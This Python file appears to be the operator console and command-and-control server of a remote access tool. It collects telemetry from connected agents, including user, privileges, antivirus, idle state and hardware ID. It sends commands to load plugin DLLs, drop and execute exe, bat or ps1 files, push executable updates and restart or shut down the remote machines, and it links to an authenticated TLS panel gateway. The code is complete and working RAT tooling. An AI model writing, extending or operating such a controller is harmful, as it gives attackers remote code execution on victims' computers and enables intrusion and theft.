import select
import struct
import ssl
import secrets
import json
import hmac
import argparse
import base64
import os
import socket
import hashlib
import queue
import threading
import time

MAX_UPDATE_BYTES = 64 * 1024 * 1024

MAX_PANEL_FRAME_BYTES = 64 * 1024
PANEL_AUTH_DOMAIN = b"ZTSEC-PANEL-AUTH-V1\x00"
PANEL_PROTOCOL_VERSION = 1

FIELDS = [
    "Country", "Nickname", "Tag", "User", "Version", "Privileges",
    "OS", "GPU", "CPU", "RAM", "AntiVirus", "Uptime", "AFK",
    "Ping", "HWID", "Fingerprint",
]

HELP_TEXT = """Commands:
  close / exit / quit        Disconnect the agent
  reconnect                  Reconnect the agent
  sleep / hibernate          Power commands
  restart / shutdown         Power commands
  load:<path>                Load a plugin DLL
  unload:<id>                Unload a loaded plugin
  event:<name>               Fire a plugin event
  execute:<ext>:<path>       Drop and run a file on the agent
                             ext: exe | bat | ps1
  update:<path>              Send an executable update as raw file bytes
  <path>                     Shorthand for load:<path>"""

def read_line(s):
    b = bytearray()
    while True:
        try:
            c = s.recv(1)
        except ConnectionResetError:
            return ""
        if not c or c == b"\n":
            return bytes(b).decode(errors="replace").rstrip("\r")
        b.extend(c)

def show(line):
    if not line.startswith("DATA:"):
        print(line)
        return
    vals = line[5:].split("|")
    for i, name in enumerate(FIELDS):
        print(f"{name}: {vals[i] if i < len(vals) else 'Unknown'}")

def wait_result(s):
    while True:
        line = read_line(s)
        if not line:
            return line
        if line.startswith("DATA:"):
            show(line)
            continue
        if line == "HB":
            s.sendall(b"PONG\n")
            continue
        print(line)
        if line.startswith("ACK:") or line.startswith("ERR:"):
            return line

def plugin_cmd(path):
    with open(path, "rb") as f:
        data = f.read()
    stem = os.path.splitext(os.path.basename(path))[0]
    b64 = base64.b64encode(data).decode()
    return f"CMD:PLUGIN:{stem}:{b64}"

def update_cmd(path):
    size = os.path.getsize(path)
    if size == 0:
        raise ValueError("update file is empty")
    if size > MAX_UPDATE_BYTES:
        raise ValueError(f"update file is larger than {MAX_UPDATE_BYTES} bytes")
    with open(path, "rb") as f:
        data = f.read()
    if len(data) != size:
        raise OSError("update file changed while it was being read")
    digest = hashlib.sha256(data).hexdigest()
    b64 = base64.b64encode(data).decode()
    return f"CMD:UPDATE:{digest}:{b64}"

def execute_cmd(ext, path):
    with open(path, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    return f"CMD:EXECUTE:{ext.lower()}:{b64}"


def _read_panel_secret(path):
    with open(path, "rb") as f:
        data = b"".join(f.read().split())
    if len(data) != 32 or any(byte < 0x21 or byte > 0x7e for byte in data):
        raise ValueError("panel secret file must contain exactly 32 printable ASCII characters")
    return data


def _write_panel_secret(path):
    secret = secrets.token_urlsafe(24)[:32].encode("ascii")
    with open(path, "xb") as f:
        f.write(secret + b"\n")
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    print(path)
    return secret


def _recv_exact(sock, size):
    out = bytearray()
    while len(out) < size:
        chunk = sock.recv(size - len(out))
        if not chunk:
            break
        out.extend(chunk)
    return bytes(out)


def _panel_send(sock, obj):
    payload = json.dumps(obj, separators=(",", ":")).encode("utf-8")
    if not payload or len(payload) > MAX_PANEL_FRAME_BYTES:
        raise ValueError("panel frame is too large")
    sock.sendall(struct.pack(">I", len(payload)) + payload)


def _panel_recv(sock):
    header = _recv_exact(sock, 4)
    if len(header) != 4:
        raise ConnectionError("panel gateway disconnected")
    size = struct.unpack(">I", header)[0]
    if size == 0 or size > MAX_PANEL_FRAME_BYTES:
        raise ValueError("invalid panel frame size")
    payload = _recv_exact(sock, size)
    if len(payload) != size:
        raise ConnectionError("panel gateway disconnected mid-frame")
    return json.loads(payload.decode("utf-8"))


def remote_panel(args):
    secret = _read_panel_secret(args.secret_file)
    context = ssl.create_default_context(cafile=args.ca_cert)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_3
    context.check_hostname = True
    server_name = args.server_name or args.host
    raw = socket.create_connection((args.host, args.port), timeout=args.timeout)
    sock = context.wrap_socket(raw, server_hostname=server_name)
    try:
        _panel_send(sock, {
            "protocol_version": PANEL_PROTOCOL_VERSION,
            "message_type": "panel_hello",
            "panel_id": args.panel_id,
        })
        challenge = _panel_recv(sock)
        if challenge.get("message_type") != "panel_challenge" or challenge.get("protocol_version") != PANEL_PROTOCOL_VERSION:
            raise PermissionError("unexpected panel challenge")
        if challenge.get("panel_id") != args.panel_id:
            raise PermissionError("panel ID mismatch")
        challenge_bytes = base64.b64decode(challenge["challenge"] + "===", validate=True)
        if len(challenge_bytes) != 32:
            raise PermissionError("invalid challenge length")
        expires_at = int(challenge.get("expires_at_ms", 0))
        if expires_at <= int(time.time() * 1000):
            raise PermissionError("panel challenge expired")
        message = PANEL_AUTH_DOMAIN + args.panel_id.encode("utf-8") + b"\0" + challenge_bytes
        proof = hmac.new(secret, message, hashlib.sha256).digest()
        _panel_send(sock, {
            "protocol_version": PANEL_PROTOCOL_VERSION,
            "message_type": "panel_proof",
            "panel_id": args.panel_id,
            "proof": base64.b64encode(proof).decode("ascii").rstrip("="),
        })
        authenticated = _panel_recv(sock)
        if authenticated.get("message_type") != "panel_authenticated":
            raise PermissionError("panel authentication failed")
        print("authenticated")
        next_ping = time.monotonic() + 30
        while True:
            wait = max(0.1, min(1.0, next_ping - time.monotonic()))
            readable, _, _ = select.select([sock], [], [], wait)
            if readable:
                event = _panel_recv(sock)
                if event.get("message_type") == "telemetry":
                    telemetry = event.get("telemetry", {})
                    for name in FIELDS:
                        print(f"{name}: {telemetry.get(name, 'Unknown')}")
                    print("---")
                elif event.get("message_type") != "panel_pong":
                    print(json.dumps(event, indent=2, sort_keys=True))
            if time.monotonic() >= next_ping:
                _panel_send(sock, {"protocol_version": PANEL_PROTOCOL_VERSION, "message_type": "panel_ping"})
                next_ping = time.monotonic() + 30
    finally:
        try:
            _panel_send(sock, {"protocol_version": PANEL_PROTOCOL_VERSION, "message_type": "panel_close"})
        except OSError:
            pass
        sock.close()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--remote-host", help="connect to the external TLS panel gateway")
    ap.add_argument("--remote-port", type=int, default=8443)
    ap.add_argument("--remote-ca-cert", dest="ca_cert", help="CA/certificate PEM used to verify the panel gateway")
    ap.add_argument("--remote-server-name", dest="server_name", help="TLS server name/IP SAN; defaults to remote host")
    ap.add_argument("--remote-secret-file", dest="secret_file", help="local file containing the 32-character panel secret")
    ap.add_argument("--remote-panel-id", dest="panel_id", default="panel-01")
    ap.add_argument("--remote-timeout", dest="timeout", type=float, default=8.0)
    ap.add_argument("--generate-remote-secret", metavar="PATH", help="generate a new 32-character local panel secret")
    ap.add_argument("--ip", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=4793)
    ap.add_argument("--test")
    ap.add_argument("--update-test")
    ap.add_argument("--expect-version")
    a = ap.parse_args()
    if a.generate_remote_secret:
        _write_panel_secret(a.generate_remote_secret)
        return
    if a.remote_host:
        if not a.ca_cert or not a.secret_file:
            ap.error("--remote-ca-cert and --remote-secret-file are required with --remote-host")
        remote_panel(a)
        return

    with socket.create_server((a.ip, a.port)) as server:
        print(f"listening {a.ip}:{a.port}")
        conn, addr = server.accept()
        with conn:
            print(f"connected {addr[0]}")
            hello = read_line(conn)
            data = read_line(conn)
            print(hello)
            show(data)
            if a.update_test:
                update_path = a.update_test
                with open(update_path, "rb") as f:
                    update_bytes = f.read()
                digest = hashlib.sha256(update_bytes).hexdigest()

                pending = queue.Queue()
                stop_accept = threading.Event()

                def handle_extra(client):
                    try:
                        hello = read_line(client)
                        data = read_line(client)
                        if hello.startswith("HELLO:UPDATE-PROBE:"):
                            fields = hello[len("HELLO:UPDATE-PROBE:"):].split(":")
                            if len(fields) != 3 or len(data) == 0 or not data.startswith("DATA:"):
                                client.close()
                                return
                            fingerprint, token, candidate_hash = fields
                            if candidate_hash.lower() != digest.lower():
                                client.sendall(b"ERR:UPDATE-PROBE\n")
                                client.close()
                                return
                            client.sendall((f"ACK:UPDATE-PROBE:{fingerprint}:{token}\n").encode())
                            client.close()
                            return
                        pending.put((client, hello, data))
                    except (ConnectionError, OSError):
                        try:
                            client.close()
                        except OSError:
                            pass

                def accept_extra():
                    while not stop_accept.is_set():
                        try:
                            server.settimeout(0.2)
                            client, _ = server.accept()
                        except socket.timeout:
                            continue
                        except OSError:
                            break
                        threading.Thread(target=handle_extra, args=(client,), daemon=True).start()

                accept_thread = threading.Thread(target=accept_extra, daemon=True)
                accept_thread.start()
                try:
                    print("update phase: sending tampered payload")
                    tampered = bytearray(update_bytes)
                    tampered[0] ^= 0xFF
                    bad = base64.b64encode(tampered).decode()
                    conn.sendall((f"CMD:UPDATE:{digest}:{bad}\n").encode())
                    bad_result = wait_result(conn)
                    if not bad_result.startswith("ERR:UPDATE:"):
                        raise SystemExit("tampered update was not rejected")

                    print("update phase: sending valid payload")
                    conn.sendall((update_cmd(update_path) + "\n").encode())
                    good_result = wait_result(conn)
                    if not good_result.startswith("ACK:UPDATE:"):
                        raise SystemExit("valid update was not acknowledged")
                    print("update phase: valid payload acknowledged")
                    conn.close()

                    deadline = time.monotonic() + 45
                    final = None
                    while time.monotonic() < deadline:
                        try:
                            client, hello, data = pending.get(timeout=0.25)
                        except queue.Empty:
                            continue
                        if hello.startswith("HELLO:FINGERPRINT:"):
                            final = (client, hello, data)
                            break
                        try:
                            client.close()
                        except OSError:
                            pass
                    if final is None:
                        raise SystemExit("updated agent did not reconnect to the server")
                    new_conn, new_hello, new_data = final
                    with new_conn:
                        print(new_hello)
                        show(new_data)
                        if a.expect_version:
                            vals = new_data[5:].split("|") if new_data.startswith("DATA:") else []
                            version = vals[FIELDS.index("Version")] if len(vals) > FIELDS.index("Version") else ""
                            if version != a.expect_version:
                                raise SystemExit(f"updated version mismatch: {version!r}")
                        new_conn.sendall(b"CMD:CLOSE\n")
                        result = wait_result(new_conn)
                        if not result.startswith("ACK:CLOSE"):
                            raise SystemExit("updated agent did not close cleanly")
                    return
                finally:
                    stop_accept.set()
                    try:
                        server.close()
                    except OSError:
                        pass

            if a.test:
                stem = os.path.splitext(os.path.basename(a.test))[0]
                cmds = [
                    plugin_cmd(a.test),
                    f"CMD:PLUGIN_EVENT:ping",
                    f"CMD:UNLOAD:{stem}",
                    "CMD:CLOSE",
                ]
                for cmd in cmds:
                    conn.sendall((cmd + "\n").encode())
                    result = wait_result(conn)
                    if result.startswith("ERR:") or not result:
                        raise SystemExit(1)
                return
            while True:
                try:
                    cmd = input("> ").strip()
                except (EOFError, KeyboardInterrupt):
                    return
                if not cmd:
                    continue
                lc = cmd.lower()
                if lc == "--help":
                    print(HELP_TEXT)
                    continue
                if lc in {"close", "exit", "quit"}:
                    conn.sendall(b"CMD:CLOSE\n")
                elif lc in {"reconnect", "sleep", "hibernate", "restart", "shutdown"}:
                    conn.sendall((f"CMD:{lc.upper()}\n").encode())
                elif lc.startswith("unload:"):
                    conn.sendall((f"CMD:UNLOAD:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("event:"):
                    conn.sendall((f"CMD:PLUGIN_EVENT:{cmd.split(':', 1)[1].strip()}\n").encode())
                elif lc.startswith("load:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((plugin_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("update:"):
                    path = cmd.split(":", 1)[1].strip()
                    try:
                        conn.sendall((update_cmd(path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                elif lc.startswith("execute:"):
                    rest = cmd.split(":", 2)
                    if len(rest) < 3:
                        print("usage: execute:<ext>:<path>")
                        continue
                    ext, path = rest[1].strip(), rest[2].strip()
                    if ext.lower() not in {"exe", "bat", "ps1"}:
                        print("error: ext must be exe, bat, or ps1")
                        continue
                    try:
                        conn.sendall((execute_cmd(ext, path) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                else:
                    try:
                        conn.sendall((plugin_cmd(cmd) + "\n").encode())
                    except OSError as e:
                        print(f"error: {e}")
                        continue
                if not wait_result(conn):
                    return
                if lc in {"close", "exit", "quit"}:
                    return

if __name__ == "__main__":
    main()
